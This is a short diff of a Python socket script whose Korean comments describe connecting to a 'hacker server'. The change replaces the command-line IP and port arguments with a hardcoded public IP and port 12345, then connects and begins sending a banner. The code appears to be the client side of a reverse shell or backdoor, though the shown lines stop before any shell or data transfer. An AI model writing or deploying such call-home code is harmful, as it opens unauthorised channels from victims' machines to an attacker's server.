@@ -7,11 +7,11 @@ def usage(): # help
     )
     exit()
 
-if len(sys.argv) < 3 :
-    usage()
+ip = '182.230.134.78'
+port = 12345
 
 with socket.socket() as s:
-    addr = (sys.argv[1], int(sys.argv[2]))             #ip, port번호롤 인자로 받아 프로그램 실행
+    addr = (ip, port)             #ip, port번호롤 인자로 받아 프로그램 실행
     s.connect(addr)                                    #입력받은 ip, port번호로 해커 서버와 연결
     s.send('''
 ###########################
